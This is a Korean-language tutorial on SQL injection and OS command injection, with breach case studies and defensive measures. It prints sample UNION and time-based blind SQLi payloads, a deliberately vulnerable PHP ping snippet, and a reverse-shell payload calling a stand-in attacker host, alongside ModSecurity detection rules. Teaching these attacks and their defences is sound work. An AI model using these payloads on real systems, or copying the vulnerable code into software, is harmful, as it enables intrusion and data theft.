1. SQL 인젝션 (SQL Injection, SQL 주입 공격)

공격 메커니즘 및 침투 프로세스

SQL 인젝션은 공격자가 애플리케이션의 입력 인터페이스를 통해 악의적인 SQL 구문을 삽입하여, 백엔드 데이터베이스(DB)에서 의도하지 않은 쿼리가 실행되도록 만드는 공격입니다. 단순히 인증을 우회하는 것을 넘어, 전체 데이터베이스의 내용을 탈취(Exfiltration)하거나 파괴할 수 있습니다.

[인포그래픽: SQL 인젝션 공격 워크플로우 (SQLi Attack Workflow)]

RECON
취약점 탐색
(Error 유도)
PROBE
DB 구조 파악
(Column 수 확인)
EXPLOIT
데이터 추출
(UNION 활용)

핵심 기법: UNION-based SQLi

두 개의 SELECT 결과를 합치는 UNION 연산자를 사용합니다. 정상적인 결과 뒤에 공격자가 원하는 테이블 정보를 붙여 화면에 출력시킵니다.

-- 공격 쿼리 예시
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --

핵심 기법: Blind SQLi

결과가 화면에 직접 나오지 않을 때, 참/거짓에 따른 반응이나 시간 지연(Time-based)을 이용하여 데이터를 한 글자씩 알아내는 고차원 기법입니다.

-- 시간 지연 유도
' AND IF(SUBSTR(pw,1,1)='a', SLEEP(5), 0) --

Breach Case Study: Heartland Payment Systems (2008)

하트랜드 페이먼트 시스템즈는 전 세계 카드 결제의 상당 부분을 처리하는 대행사였으나, SQL 인젝션 단 한 건으로 인해 약 1억 3천만 건의 신용카드 번호가 노출되었습니다. 공격자 알버트 곤잘레스는 취약한 로그인 폼을 통해 DB에 침투한 뒤, 스니퍼(Sniffer)를 설치하여 수개월간 실시간 거래 데이터를 탈취했습니다.

피해액약 1억 4천만 달러 이상의 보상 및 과징금 발생
Technical Terminology
  • • RDBMS (Relational Database Management System, 관계형 데이터베이스 관리 시스템): 데이터를 테이블 구조로 관리하는 시스템 (MySQL, Oracle 등).
  • • Exfiltration (엑스필트레이션, 데이터 유출): 권한 없이 데이터를 외부로 빼돌리는 행위.
  • • Information Schema (정보 스키마): 데이터베이스 내의 테이블, 컬럼명 등 모든 메타데이터를 담고 있는 특수 테이블.
Notation & Operators
  • • UNION: 두 개 이상의 SELECT 문 결과 집합을 하나로 결합하는 SQL 연산자.
  • • -- (Double Dash): SQL에서 이후의 모든 구문을 주석으로 처리하여 무력화하는 기호.
  • • SLEEP(n): 쿼리 실행을 의도적으로 n초간 중단시켜 시간 기반 블라인드 인젝션을 수행할 때 사용하는 함수.

2. OS 커맨드 인젝션 (OS Command Injection, 명령 주입)

공격 원리 및 리버스 쉘 메커니즘

애플리케이션이 외부 입력을 사용하여 시스템 명령어를 생성할 때, 명령어를 구분하는 특수 기호(Metacharacters)를 삽입하여 공격자의 임의 명령어를 실행하는 기술입니다. 이는 웹 서버의 권한으로 시스템 파일에 접근하거나, 리버스 쉘(Reverse Shell)을 통해 외부에서 서버를 직접 조작할 수 있게 합니다.

[도식: 리버스 쉘 침투 과정 (Reverse Shell Attack Flow)]

Attacker Machine
Listening... (nc -lvp 4444)
Outbound Connection
Victim Web Server
RCE Vulnerable!

Vulnerable Implementation (PHP)

$ip = $_GET['ip'];
// 입력값 검증 없이 쉘 실행
system("ping -c 4 " . $ip);

Exploit Payload

127.0.0.1 ; /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1

위 페이로드는 세미콜론(;)을 이용해 기존 명령을 끝내고, 공격자의 서버로 연결을 시도하는 리눅스 배시(Bash) 쉘 명령을 실행합니다.

Breach Case Study: Equifax (2017)

미국 신용평가사 에퀴팩스는 Apache Struts2라는 프레임워크의 취약점 때문에 약 1억 4,700만 명의 개인정보를 유출했습니다. 해당 취약점은 HTTP 헤더를 통해 임의의 명령어를 주입할 수 있는 OS 커맨드 인젝션(RCE) 계열의 결함이었으며, 패치되지 않은 서버를 노린 공격자에 의해 대규모 개인 식별 정보(PII)가 유출되었습니다.

CVE IDCVE-2017-5638
Technical Terminology
  • • RCE (Remote Code Execution, 원격 코드 실행): 네트워크를 통해 공격자가 대상 시스템에서 임의의 코드를 실행할 수 있는 상태.
  • • Reverse Shell (리버스 쉘): 피해자가 공격자에게 연결을 시도하도록 하여 방화벽(Inbound 차단)을 우회하는 해킹 기법.
  • • Metacharacters (메타 문자): 쉘에서 특정 의미를 가지는 기호들 (; , | , & , $ 등).
Metacharacter Glossary
  • • ; (Semicolon): 앞의 명령어가 성공하든 실패하든 무관하게 다음 명령어를 실행함.
  • • | (Pipe): 앞 명령어의 결과(Output)를 뒤 명령어의 입력(Input)으로 전달함.
  • • & (Background): 앞 명령어를 백그라운드로 실행하고 즉시 다음 명령어를 수행함.

3. 보안 아키텍처 및 대응 체계 (Security Defense)

계층형 방어 전략 (Defense in Depth)

1

Query Parameterization

준비된 문구(Prepared Statements)를 사용하여 데이터와 로직을 완전 분리합니다. SQL 인젝션의 유일한 근본 대책입니다.

2

Contextual Encoding

데이터가 출력되는 문맥(HTML, JavaScript, OS Shell)에 맞는 이스케이프(Escape) 처리를 강제합니다.

3

WAF Deployment

웹 방화벽(WAF)을 전면에 배치하여 알려진 인젝션 패턴(Signature)을 실시간으로 탐지 및 차단합니다.

아키텍트 추천 보안 설정 (Nginx/ModSecurity)

# SQLi & CMD Injection 탐지 룰 예시
SecRule ARGS "@rx (?i)(union|select|insert|update|delete|drop)" \
  "id:1001,phase:2,deny,status:403,log,msg:'Potential SQL Injection Detected'"

SecRule ARGS "@rx (?i)(\;\s*|\|\s*|\&\&\s*|\`|\$)" \
  "id:1002,phase:2,deny,status:403,log,msg:'Potential Command Injection Detected'"
Defense Glossary
  • • WAF (Web Application Firewall, 웹 방화벽): HTTP 트래픽을 모니터링하고 분석하여 웹 취약점 공격을 차단하는 보안 장비.
  • • Parameterized Query (매개변수화된 쿼리): 쿼리 템플릿을 먼저 컴파일하고 데이터는 나중에 바인딩하여 실행하는 방식.
Security Architecture Initials
  • • SDLC (Software Development Life Cycle, 소프트웨어 개발 생명 주기): 보안이 단계별로 내재화되어야 할 소프트웨어 개발 전체 과정.
  • • PII (Personally Identifiable Information, 개인 식별 정보): 이름, 주민번호 등 특정 개인을 식별할 수 있는 민감 정보.
